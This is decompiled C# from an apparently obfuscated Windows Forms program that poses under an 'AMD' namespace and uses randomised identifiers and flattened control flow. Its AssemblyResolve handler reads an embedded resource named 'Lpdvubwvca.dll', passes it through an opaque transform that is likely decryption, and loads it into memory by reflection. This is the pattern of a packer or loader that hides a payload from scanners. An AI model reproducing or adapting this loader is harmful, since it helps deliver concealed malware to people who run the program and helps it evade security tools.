using System;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using AMD.Containers;
using Lzzowqrhuwjro.Attributes;
using Lzzowqrhuwjro.Schemes;

namespace AMD.Collections;

internal static class ImporterSetterCollection
{
	private static ImporterSetterCollection EnableExporter;

	[STAThread]
	private static void AddInterpreter()
	{
		int num = 5;
		while (true)
		{
			Application.EnableVisualStyles();
			int num2 = 2;
			if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_a8a206bd1715438bb4796cad102513f3 != 0)
			{
				goto IL_000b;
			}
			goto IL_005d;
			IL_005d:
			switch (num2)
			{
			case 2:
			case 7:
				break;
			default:
				goto IL_001e;
			case 3:
			case 6:
				goto IL_002c;
			case 4:
			case 5:
				continue;
			case 1:
				return;
			}
			goto IL_000b;
			IL_000b:
			Application.SetCompatibleTextRenderingDefault(false);
			num2 = 0;
			if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_eeafc1eeac6a432588d0aff6904f9268 == 0)
			{
				goto IL_001e;
			}
			goto IL_005d;
			IL_001e:
			CreatorStrategyContainer.PopCollection();
			num = 3;
			goto IL_002c;
			IL_002c:
			AppDomain.CurrentDomain.AssemblyResolve += ViewInterpreter;
			Application.Run((Form)(object)new SpecificationDatabaseSchema());
			num2 = 1;
			if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_ec3d38e520bb4619b9c284fa0b7b3952 == 0)
			{
				num2 = num;
			}
			goto IL_005d;
		}
	}

	private static Assembly ViewInterpreter(object param, ResolveEventArgs b)
	{
		Stream manifestResourceStream = ((Assembly)ComputeExporter()).GetManifestResourceStream("Lzzowqrhuwjro.Lpdvubwvca.dll");
		Assembly result = default(Assembly);
		if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_49808170ff704affa5c3d20de1db2ca4 != 0)
		{
			switch (1)
			{
			case 1:
				break;
			default:
				return result;
			}
		}
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_0576a61ffc8a4ea29dea528321ad284f != 0)
			{
				switch (0)
				{
				}
			}
			try
			{
				QueryExporter(manifestResourceStream, memoryStream);
				if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_d9668d87e9514e84bd037ce05240458b == 0)
				{
					switch (0)
					{
					case 1:
						return result;
					}
				}
				return (Assembly)((AppDomain)RateExporter()).GetType().InvokeMember("Load", BindingFlags.InvokeMethod, null, ResetExporter(), new object[1] { PatchExporter(DestroyExporter(memoryStream)) });
			}
			finally
			{
				RegisterExporter(memoryStream);
			}
		}
		finally
		{
			if (manifestResourceStream != null)
			{
				((IDisposable)manifestResourceStream).Dispose();
				if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_55ad10de5a5648279d9b301227bb721b == 0)
				{
					switch (0)
					{
					}
				}
			}
		}
	}

	internal static bool PushExporter()
	{
		return EnableExporter == null;
	}

	internal static ImporterSetterCollection StopExporter()
	{
		return EnableExporter;
	}

	internal static object ComputeExporter()
	{
		return Assembly.GetExecutingAssembly();
	}

	internal static void QueryExporter(object object_0, object object_1)
	{
		((Stream)object_0).CopyTo((Stream)object_1);
	}

	internal static object RateExporter()
	{
		return Thread.GetDomain();
	}

	internal static object ResetExporter()
	{
		return AppDomain.CurrentDomain;
	}

	internal static object DestroyExporter(object object_0)
	{
		return ((MemoryStream)object_0).ToArray();
	}

	internal static object PatchExporter(object object_0)
	{
		return Database.PrintInterpreter((byte[])object_0);
	}

	internal static void RegisterExporter(object object_0)
	{
		((IDisposable)object_0).Dispose();
	}
}
